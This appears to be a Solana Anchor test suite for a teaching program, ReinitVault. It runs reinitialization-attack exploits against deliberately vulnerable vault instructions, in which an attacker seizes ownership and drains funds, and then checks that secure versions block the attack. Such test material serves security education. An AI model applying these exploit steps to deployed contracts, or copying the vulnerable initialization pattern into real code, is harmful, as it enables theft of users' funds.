import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ReinitVault } from "../target/types/reinit_vault";
import { expect } from "chai";

describe("Reinitialization Attack Exploit", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.ReinitVault as Program<ReinitVault>;
  const provider = anchor.getProvider();

  // Test accounts
  let legitimateOwner: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let vulnerableVault: anchor.web3.Keypair;
  let secureVault: anchor.web3.Keypair;

  beforeEach(async () => {
    // Generate fresh keypairs for each test
    legitimateOwner = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    vulnerableVault = anchor.web3.Keypair.generate();
    secureVault = anchor.web3.Keypair.generate();

    // Airdrop SOL to test accounts
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(legitimateOwner.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(attacker.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
  });

  describe("ðŸš¨ EXPLOIT DEMONSTRATION - Vulnerable Implementation", () => {
    it("Should allow attacker to reinitialize vault and steal ownership", async () => {
      console.log("\n=== EXPLOIT: Reinitialization attack to steal vault ownership ===");
      console.log(`Legitimate Owner: ${legitimateOwner.publicKey.toString()}`);
      console.log(`Attacker: ${attacker.publicKey.toString()}`);

      // Step 1: Legitimate owner creates and funds a vault
      await program.methods
        .vulnerableInitialize(new anchor.BN(10000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      // Add more funds to make it attractive
      await program.methods
        .vulnerableDeposit(new anchor.BN(15000))
        .accounts({
          vault: vulnerableVault.publicKey,
          depositor: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`Initial vault owner: ${vaultAccount.owner.toString()}`);
      console.log(`Initial vault balance: ${vaultAccount.balance.toString()}`);
      console.log(`Total deposits: ${vaultAccount.totalDeposits.toString()}`);

      // Step 2: EXPLOIT - Attacker reinitializes the vault with themselves as owner
      console.log("\nðŸš¨ EXECUTING REINITIALIZATION ATTACK...");
      
      await program.methods
        .vulnerableInitialize(new anchor.BN(1)) // Reset with minimal balance
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey, // Attacker becomes new owner
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      // Verify the exploit worked
      vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`After reinitialization - Owner: ${vaultAccount.owner.toString()}`);
      console.log(`After reinitialization - Balance: ${vaultAccount.balance.toString()}`);
      console.log(`After reinitialization - Total deposits: ${vaultAccount.totalDeposits.toString()}`);

      expect(vaultAccount.owner.toString()).to.equal(attacker.publicKey.toString());
      expect(vaultAccount.balance.toNumber()).to.equal(1); // Reset to attacker's value
      expect(vaultAccount.totalDeposits.toNumber()).to.equal(1); // Reset
      
      console.log("âœ… EXPLOIT SUCCESS: Attacker stole vault ownership via reinitialization!");
    });

    it("Should allow attacker to drain vault after reinitialization", async () => {
      console.log("\n=== EXPLOIT: Complete vault drainage after reinitialization ===");

      // Legitimate owner creates and funds vault
      await program.methods
        .vulnerableInitialize(new anchor.BN(5000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      await program.methods
        .vulnerableDeposit(new anchor.BN(20000))
        .accounts({
          vault: vulnerableVault.publicKey,
          depositor: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      const originalBalance = vaultAccount.balance.toNumber();
      console.log(`Victim's vault balance: ${originalBalance}`);

      // EXPLOIT: Reinitialize with attacker as owner
      await program.methods
        .vulnerableInitialize(new anchor.BN(originalBalance)) // Keep same balance but change owner
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      // Now attacker can withdraw all funds
      await program.methods
        .vulnerableWithdraw(new anchor.BN(originalBalance))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey,
        })
        .signers([attacker])
        .rpc();

      vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`Final vault balance: ${vaultAccount.balance.toString()}`);

      expect(vaultAccount.balance.toNumber()).to.equal(0);
      expect(vaultAccount.owner.toString()).to.equal(attacker.publicKey.toString());
      
      console.log("ðŸš¨ EXPLOIT SUCCESS: Attacker drained entire vault after reinitialization!");
    });

    it("Should demonstrate multiple reinitialization attacks", async () => {
      console.log("\n=== EXPLOIT: Multiple reinitialization cycles ===");

      // Initial setup by legitimate owner
      await program.methods
        .vulnerableInitialize(new anchor.BN(1000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`Cycle 1 - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);

      // First reinitialization by attacker
      await program.methods
        .vulnerableInitialize(new anchor.BN(2000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`Cycle 2 - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);
      expect(vaultAccount.owner.toString()).to.equal(attacker.publicKey.toString());

      // Second reinitialization back to legitimate owner (if they discover the attack)
      await program.methods
        .vulnerableInitialize(new anchor.BN(3000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner])
        .rpc();

      vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`Cycle 3 - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);
      expect(vaultAccount.owner.toString()).to.equal(legitimateOwner.publicKey.toString());

      console.log("âš ï¸  EXPLOIT SUCCESS: Multiple reinitialization cycles completed!");
    });

    it("Should show vulnerable manual initialization can be bypassed", async () => {
      console.log("\n=== EXPLOIT: Bypassing weak manual initialization check ===");

      // First initialization
      await program.methods
        .vulnerableManualInit(new anchor.BN(5000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
      console.log(`After first init - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);
      console.log(`After first init - Balance: ${vaultAccount.balance.toString()}`);

      // This should fail according to the manual check, but let's see if we can bypass it
      try {
        await program.methods
          .vulnerableManualInit(new anchor.BN(10000))
          .accounts({
            vault: vulnerableVault.publicKey,
            owner: attacker.publicKey,
            systemProgram: anchor.web3.SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        // If we reach here, the manual check was bypassed
        vaultAccount = await program.account.reinitVault.fetch(vulnerableVault.publicKey);
        console.log("ðŸš¨ Manual check bypassed!");
        console.log(`After bypass - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);
        console.log(`After bypass - Balance: ${vaultAccount.balance.toString()}`);
        
        expect(vaultAccount.owner.toString()).to.equal(attacker.publicKey.toString());
        console.log("âœ… EXPLOIT SUCCESS: Manual initialization check bypassed!");
      } catch (error) {
        console.log("Manual check worked as intended (this time)");
        console.log(`Error: ${error.message}`);
        expect(error.message).to.include("AlreadyInitialized");
      }
    });
  });

  describe("ðŸ›¡ï¸  PROTECTION VERIFICATION - Secure Implementation", () => {
    it("Should prevent reinitialization using Anchor's init constraint", async () => {
      console.log("\n=== PROTECTION: Secure initialization prevents reinitialization ===");

      // First initialization should succeed
      await program.methods
        .secureInitialize(new anchor.BN(10000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      console.log(`Secure vault initialized - Owner: ${vaultAccount.owner.toString().slice(0, 8)}...`);
      console.log(`Secure vault balance: ${vaultAccount.balance.toString()}`);

      try {
        // Attempt reinitialization - this should fail
        console.log("Attempting reinitialization attack on secure vault...");
        
        await program.methods
          .secureInitialize(new anchor.BN(1))
          .accounts({
            vault: secureVault.publicKey,
            owner: attacker.publicKey,
            systemProgram: anchor.web3.SystemProgram.programId,
          })
          .signers([attacker, secureVault])
          .rpc();

        // If we reach here, the test failed
        expect.fail("Expected reinitialization to fail but it succeeded");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Reinitialization blocked by init constraint");
        console.log(`Error: ${error.message}`);
        // Anchor's init constraint should prevent this
        expect(error.message).to.include("already in use");
      }

      // Verify vault state unchanged
      vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      expect(vaultAccount.owner.toString()).to.equal(legitimateOwner.publicKey.toString());
      expect(vaultAccount.balance.toNumber()).to.equal(10000);
      console.log("âœ… Vault ownership and balance remain secure");
    });

    it("Should prevent unauthorized access after failed reinitialization", async () => {
      console.log("\n=== PROTECTION: Secure vault maintains access control ===");

      // Initialize secure vault
      await program.methods
        .secureInitialize(new anchor.BN(15000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      // Try to withdraw as attacker (should fail due to has_one constraint)
      try {
        await program.methods
          .secureWithdraw(new anchor.BN(5000))
          .accounts({
            vault: secureVault.publicKey,
            owner: attacker.publicKey,
          })
          .signers([attacker])
          .rpc();

        expect.fail("Expected unauthorized withdrawal to fail");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Unauthorized withdrawal blocked");
        console.log(`Error: ${error.message}`);
        expect(error.message).to.include("has_one");
      }

      // Verify legitimate owner can still access
      await program.methods
        .secureWithdraw(new anchor.BN(2000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      const vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(13000);
      console.log("âœ… Legitimate owner retains full access");
    });

    it("Should demonstrate secure manual initialization protection", async () => {
      console.log("\n=== PROTECTION: Secure manual initialization ===");

      // First initialization should succeed
      await program.methods
        .secureManualInit(new anchor.BN(8000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      console.log(`Manual init successful - Balance: ${vaultAccount.balance.toString()}`);

      try {
        // Attempt second initialization - should fail
        await program.methods
          .secureManualInit(new anchor.BN(1000))
          .accounts({
            vault: secureVault.publicKey,
            owner: attacker.publicKey,
            systemProgram: anchor.web3.SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        expect.fail("Expected second manual initialization to fail");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Secure manual initialization blocked reinitialization");
        console.log(`Error: ${error.message}`);
        // Should fail due to init_if_needed constraint
      }
    });

    it("Should demonstrate secure reset functionality with proper authorization", async () => {
      console.log("\n=== PROTECTION: Secure reset with authorization ===");

      // Initialize and empty the vault
      await program.methods
        .secureInitialize(new anchor.BN(1000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      // Withdraw all funds to enable reset
      await program.methods
        .secureWithdraw(new anchor.BN(1000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      // Legitimate owner can reset empty vault
      await program.methods
        .secureReset()
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      const vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(0);
      expect(vaultAccount.isInitialized).to.be.false;
      console.log("âœ… Authorized reset completed successfully");
    });
  });

  describe("âœ… LEGITIMATE USAGE - Normal Operations", () => {
    it("Should allow normal vault operations without reinitialization concerns", async () => {
      console.log("\n=== LEGITIMATE USAGE: Normal secure vault lifecycle ===");

      // Initialize vault
      await program.methods
        .secureInitialize(new anchor.BN(5000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      console.log(`Initial balance: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(5000);
      expect(vaultAccount.isInitialized).to.be.true;

      // Deposit funds
      await program.methods
        .secureDeposit(new anchor.BN(3000))
        .accounts({
          vault: secureVault.publicKey,
          depositor: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      console.log(`Balance after deposit: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(8000);

      // Withdraw some funds
      await program.methods
        .secureWithdraw(new anchor.BN(2000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      console.log(`Final balance: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(6000);

      // Verify vault remains properly initialized and owned
      expect(vaultAccount.owner.toString()).to.equal(legitimateOwner.publicKey.toString());
      expect(vaultAccount.isInitialized).to.be.true;

      console.log("âœ… All legitimate operations completed successfully");
    });

    it("Should handle edge cases properly", async () => {
      console.log("\n=== LEGITIMATE USAGE: Edge case handling ===");

      // Initialize with zero balance
      await program.methods
        .secureInitialize(new anchor.BN(0))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.reinitVault.fetch(secureVault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(0);
      expect(vaultAccount.isInitialized).to.be.true;

      // Try to withdraw from empty vault
      try {
        await program.methods
          .secureWithdraw(new anchor.BN(1))
          .accounts({
            vault: secureVault.publicKey,
            owner: legitimateOwner.publicKey,
          })
          .signers([legitimateOwner])
          .rpc();

        expect.fail("Expected withdrawal from empty vault to fail");
      } catch (error) {
        console.log("âœ… Empty vault withdrawal properly rejected");
        expect(error.message).to.include("InsufficientFunds");
      }

      console.log("âœ… Edge cases handled correctly");
    });
  });
});